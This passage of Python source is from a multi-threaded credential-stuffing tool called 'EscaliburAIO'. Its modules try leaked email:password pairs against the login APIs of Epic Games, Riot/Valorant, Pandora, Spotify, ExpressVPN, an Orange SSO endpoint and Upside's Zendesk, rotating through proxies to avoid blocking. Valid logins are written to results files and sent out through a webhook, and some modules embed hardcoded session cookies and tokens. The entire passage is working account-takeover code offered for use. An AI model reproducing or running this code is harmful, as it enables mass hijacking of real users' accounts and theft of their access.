        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Mail Access"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Mail_Access_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def uPlay():
        print("This option is off..")
        time.sleep(2)
        menu()

    def EpicGames_check(email, password, proxylist, captcha):
        global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                
                headers = {
                    "Host":"www.epicgames.com", 
                    "Connection":"keep-alive", 
                    "Accept":"application/json, text/plain, */*" ,
                    "Accept-Language":"en-US" ,
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.10.7-10732818+++Portal+Release-Live UnrealEngine/4.21.0-10732818+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36" ,
                    "X-Requested-With":"XMLHttpRequest" ,
                    "Referer":"https://www.epicgames.com/id/login" ,
                    "Accept-Encoding":"gzip, deflate" 
                }

                r = sess.post("https://www.epicgames.com/id/api/location", headers=headers)


                headers = {
                "Host":"www.epicgames.com", 
                "Connection":"keep-alive", 
                "Accept":"application/json, text/plain, */*", 
                "Accept-Language":"en-US", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.10.7-10732818+++Portal+Release-Live UnrealEngine/4.21.0-10732818+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36", 
                "X-Epic-Strategy-Flags":"guardianEmailVerifyEnabled=false;guardianEmbeddedDocusignEnabled=false;registerEmailPreVerifyEnabled=false;unrealEngineGamingEula=true", 
                "X-Requested-With":"XMLHttpRequest", 
                "Referer":"https://www.epicgames.com/id/login", 
                "Accept-Encoding":"gzip, deflate" 
                }

                f = sess.get("https://www.epicgames.com/id/api/csrf", headers=headers)

                token1 = f.cookies.get("XSRF-TOKEN")

                headers = {
                "Host":"www.epicgames.com", 
                "Connection":"keep-alive", 
                "Accept":"application/json, text/plain, */*", 
                "Accept-Language":"en-US", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.10.7-10732818+++Portal+Release-Live UnrealEngine/4.21.0-10732818+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36", 
                "X-Epic-Strategy-Flags":"guardianEmailVerifyEnabled=false;guardianEmbeddedDocusignEnabled=false;registerEmailPreVerifyEnabled=false;unrealEngineGamingEula=true", 
                "X-Requested-With":"XMLHttpRequest",
                "X-XSRF-TOKEN":token1, 
                "Referer":"https://www.epicgames.com/id/login", 
                "Accept-Encoding":"gzip, deflate", 
                }

                f = sess.get("https://www.epicgames.com/id/api/csrf", headers=headers)

                token2 = f.cookies.get("XSRF-TOKEN")

                headers = {
                "content-type":"application/json;charset=UTF-8", 
                "Host":"www.epicgames.com", 
                "Connection":"keep-alive", 
                "Content-Length":"87", 
                "Accept":"application/json, text/plain, */*", 
                "Accept-Language":"en-US", 
                "Content-Type":"application/json;charset=UTF-8", 
                "Origin":"https://www.epicgames.com", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.10.7-10732818+++Portal+Release-Live UnrealEngine/4.21.0-10732818+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36", 
                "X-Epic-Strategy-Flags":"guardianEmailVerifyEnabled=false;guardianEmbeddedDocusignEnabled=false;registerEmailPreVerifyEnabled=false;unrealEngineGamingEula=true", 
                "X-Requested-With":"XMLHttpRequest", 
                "X-XSRF-TOKEN":token2, 
                "Referer":"https://www.epicgames.com/id/login", 
                "Accept-Encoding":"gzip, deflate" 
                }

                content = {"email":username,"password":password,"rememberMe":"false","captcha":captcha}


                r = sess.post("https://www.epicgames.com/id/api/login", headers=headers, json=content)
                if "\"errors.com.epicgames.accountportal.reputation_session_invalidated\"" in r.text:
                    headers = {
                        "Content-Type":"application/json;charset=UTF-8", 
                        "Host":"www.epicgames.com" ,
                        "Connection":"keep-alive" ,
                        "Content-Length":"87" ,
                        "Accept":"application/json, text/plain, */*" ,
                        "Accept-Language":"en-US" ,
                        "Content-Type":"application/json;charset=UTF-8" ,
                        "Origin":"https://www.epicgames.com" ,
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/10.10.7-10732818+++Portal+Release-Live UnrealEngine/4.21.0-10732818+++Portal+Release-Live Chrome/59.0.3071.15 Safari/537.36" ,
                        "X-Epic-Strategy-Flags":"guardianEmailVerifyEnabled=false;guardianEmbeddedDocusignEnabled=false;registerEmailPreVerifyEnabled=false;unrealEngineGamingEula=true" ,
                        "X-Requested-With":"XMLHttpRequest" ,
                        "X-XSRF-TOKEN":token2,
                        "Referer":"https://www.epicgames.com/id/login" ,
                        "Accept-Encoding":"gzip, deflate" ,
                    }
                    content = {"email":username,"password":password,"rememberMe":"false","captcha":captcha}
                    
                    r = sess.post("https://www.epicgames.com/id/api/login", json=content, headers=headers)
                    if r.status_code == 400:
                        bad+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    elif r.status_code == 200:
                        good+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                        webhook("{}:{}".format(email, password))
                    elif "errors.com.epicgames.common.two_factor_authentication.required" in r.text:
                        banned+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/2fa.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    elif "The page is temporarily unavailable" or "Sorry, you are visiting our service too frequent, please try again later" in r.text:
                        banned+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    elif r.status_code == 409:
                        banned+=1
                        checked+=1
                        cpm+=1
                        open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=EpicGames_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=EpicGames_check, args=(emails, passwords, proxylist,)).start()
    def EpicGames():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Please Type your captcha code:")
        captcha = input(" ")
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="EpicGames"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=EpicGames_check, args=(emails[num],passwords[num], proxylist, captcha,)).start()
                    num += 1

    def Valorant_check(email, password, proxylist):
        global proxy_line
        global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                login_content = f"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|{email}&password={password}&scope=openid offline_access lol ban profile email phone"
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "application/json",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
                    "Pragma": "no-cache"
                }

                r = sess.post("https://auth.riotgames.com/token", data=login_content, headers=headers)
                if "access_token" in r.text:
                    good+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "invalid_credentials" in r.text:
                    bad+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Valorant_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Valorant_check, args=(emails, passwords, proxylist,)).start()
    def Valorant():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Valorant"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Valorant_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def Steam():
        print("This option is off..")
        time.sleep(2)
        menu()
    def Blizzard():
        print("This option is off..")
        time.sleep(2)
        menu()
    # Streaming

    def Netflix_check(email,password,proxylist):
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://sso.orange.com/WT/userinfo/" 
                headers = {
                    "content-type": "application/x-www-form-urlencoded",
                    "User-Agent": "Orange TV_Android_7.2.0-2000_LG_LG-M700N_22_LL-Master3.9.5-1_HL-Sprint7.0.9-3",
                    "Accept": "*/*",
                    "Pragma": "no-cache",
                    "X_OPENTV_PSE": "p_appliTV",
                    "X_OPENTV_PE": "pe_appliTV",
                    "X_OPENTV_ACTIVECONTEXT": "I",
                    "X_OPENTV_PARENT_SESSION_ID": "APP-1804476f-d380-4059-abcc-c23aab59269d",
                    "X_OPENTV_DID": "FB7C279E-0B89-E3C9-8503-3C1AEB89D309-DC7F2A58",
                    "X-BEARER": "WIFI"

                }
                content = f"wt-email={email}&wt-pwd={password}&serv=OTVSDK&charset=utf_8&info=cooses&wt-cvt=4&wt-mco=MCO%3DOFR" 
                r = sess.post(url, headers=headers, data=content)
                if r.status_code == 403:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "identifiers" in r.text:
                    good+=1
                    checked+=1
                    cpm+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=Netflix_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Netflix_check, args=(email,password, proxylist,)).start()
    def Netflix():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Netflix"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Netflix_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def ExpressVPN_check(email,password,proxylist):
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://www.bezakef.net/vpn_servers?password={}&smart_location=1&dpi=mdpi&client_version=android_6.8.1&bundleid=com.expressvpn.vpn&email={}&version_code=6374&conn_requests=1&use_user_pass=1&include_purchase_items=android&include_country_and_region=1&include_recommended_clusters=1&device_id=ffffffff-e74f-42e8-1650-78bb16604b92&ca_version=2&show_messages=1&device_name=SM-G935F&include_server_list=1&rdid=7c3ea819-5243-4ea9-a972-add420b83a92&os_version=android5.1.1&lat=0".format(password,email)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Accept": "*/*",
                    "User-Agent": "Android 8.1.0 App Version 6.7.3 - 4009",
                    "Pragma": "no-cache"
                }

                r = sess.get(url, data="", headers=headers, allow_redirects=True)

                if "status>ACTIVE</status" in r.text:
                    plan = search(r'plan_type>(.*?)<', str(r.text)).group(1)
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{} | Plan: {}\n".format(email, password, plan))
                elif "authentication failed" or "Payment Verification Needed" or "We're sorry, but something went wrong." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=ExpressVPN_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=ExpressVPN_check, args=(email,password, proxylist,)).start()
    def ExpressVPN():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="ExpressVPN"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=ExpressVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Pandora_check(email,password,proxylist):
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                headers = {
                    "Host":"www.pandora.com",
                    "Connection":"keep-alive",
                    "Accept":"application/json, text/plain, */*",
                    "X-CsrfToken":"af97237b5b0c294d",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
                    "Content-Type":"application/json",
                    "Origin":"https://www.pandora.com",
                    "Sec-Fetch-Site":"same-origin",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Dest":"empty",
                    "Referer":"https://www.pandora.com/account/sign-in",
                    "Accept-Language":"en-US,en;q=0.9",
                    "Cookie":"csrftoken=af97237b5b0c294d; http_referrer=https://duckduckgo.com/; at=wuF6FEGp8IBbQdfF/bWGs3pGRth8AXqJtL2LPnS1QYuw=; lithiumSSO%3Apandora.prod=~2jbn3BmBlUeik3esa~5DO3rq3PDrLy5W9-IoWV-cFjLFcenGul4QPxa9UkGWwImFkKKofGo2FY1SWPzIUSNaAvd_9AgFsuqFz3uDqW2J4mFe9OBqGSdIBklyrFvD1L945__mf7UDNfzV7S_y4b5GpVcJHzAzNyu0gxThlQDHHr-g1ELh42UFOQla5HsEkwHmCJFvvVawxLzh0KjtXtMwU3aXF-ICAjGJifH7yEZw..",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Length":"100"
                }


                content = {"existingAuthToken":"null","username":email,"password":password,"keepLoggedIn":"true"}

                r = sess.post("https://www.pandora.com/api/v1/auth/login", json=content, headers=headers)
                if "authToken" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Invalid username and/or password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Pandora_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Pandora_check, args=(email,password, proxylist,)).start()
    def Pandora():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Pandora"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Pandora_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def GetUpside_check(email,password,proxylist):
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                before = email.split("@")[0]
                after = email.split("@")[1]

                headers = {
                    "Host": "upside.zendesk.com",
                    "Connection": "keep-alive",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://upside.zendesk.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "https://upside.zendesk.com/auth/v2/login/signin?return_to=https%3A%2F%2Fsupport.getupside.com%2Fhc%2Fen-us%2Fcategories%2F202761688-Your-Account&theme=hc&locale=en-us&brand_id=1052957&auth_origin=1052957%2Ctrue%2Ctrue",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cookie": "__cfruid=d6cf43d8d077c5d3addc4751cf20fda3c2072149-1589796918; _zendesk_shared_session=-R0oyM0VzZC9WS2QxaGdWQmxQMURWZzZqK00wRmVUcXIxNlBVbGI0SWRyOFo3OUVxWS9KVnBhKzljVmxTRGtlczM0WEV4Q21JL0hUeFRZZ0V5bURoUGFEUHpZRXR5NzJvVVhxRkkyUnI4VVdVUkpsVUJJb1ZCalY1Z3RTMHhvYm1HdFFwVUhqeTJSRDR6L3N4WU9EeHlRPT0tLURHemhDSlFnSUZMQVdEY1huUzFiZFE9PQ%3D%3D--7682496e5f804bd0f5f3e940b0d041082b326cef; _zendesk_session=BAh7CkkiD3Nlc3Npb25faWQGOgZFVEkiJTJmYWJlZGUwMDFmNGZjZjRkOGYxOWRlYTRjNTk4NTc2BjsAVEkiDGFjY291bnQGOwBGaQNYEQ9JIgpyb3V0ZQY7AEZpAzqhDUkiE3dhcmRlbi5tZXNzYWdlBjsAVHsASSIQX2NzcmZfdG9rZW4GOwBGSSJFZU1lcEM3dmE1dkJodFVrNmJoL3RwZTdGbnhZZXp2bDBoaHNKTmxBdTlRN3R2dWhBdXBsdE1ydEllWXpBRVJKNgY7AEY%3D--97ae2a70b04c05750ca06fb6b48abdae385f68d4",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Length": "682"
                }

                url = "https://upside.zendesk.com/access/login"

                content = f"utf8=%E2%9C%93&authenticity_token=eMepC7va5vBhtUk6bh%2Ftpe7FnxYezvl0hhsJNlAu9Q7tvuhAupltMrtIeYzAERJ6&return_to_on_failure=%2Fauth%2Fv2%2Flogin%2Fsignin%3Freturn_to%3Dhttps%253A%252F%252Fsupport.getupside.com%252Fhc%252Fen-us%252Fcategories%252F202761688-Your-Account%26theme%3Dhc%26locale%3Den-us%26brand_id%3D1052957%26auth_origin%3D1052957%252Ctrue%252Ctrue&return_to=https%3A%2F%2Fsupport.getupside.com%2Fauth%2Fv2%2Flogin%2Fsigned_in%3Fauth_origin%3D1052957%252Ctrue%252Ctrue%26brand_id%3D1052957%26theme%3Dhc&brand_id=1052957&theme=hc&auth_origin=1052957%2Ctrue%2Ctrue&form_origin=hc&user%5Bemail%5D={before}%40{after}&user%5Bpassword%5D={password}&remember_me=1&commit=Sign+in"

                r = sess.post(url, data=content, headers=headers)
                if "Email address / password combination is incorrect," in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "<head><title>403 Forbidden</title></head>" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=GetUpside_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=GetUpside_check, args=(email,password, proxylist,)).start()
    def GetUpside():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="GetUpSide"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=GetUpside_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Spotify_check(email,password, proxylist):
        global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                f = sess.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F", headers=headers)

                csrf = f.cookies.get("csrf_token")

                content = f"remember=true&username={email}&password={password}&csrf_token={csrf}"
                cookies = dict(__bon='MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx') 
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post("https://accounts.spotify.com/api/login", headers=headers, data=content, cookies=cookies)
                if "{\"error\":\"errorInvalidCredentials\"}"in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "{\"displayName\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))

                elif "Oops! Something went wrong, please try again or check out our" in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Spotify_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            pass
    def Spotify():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
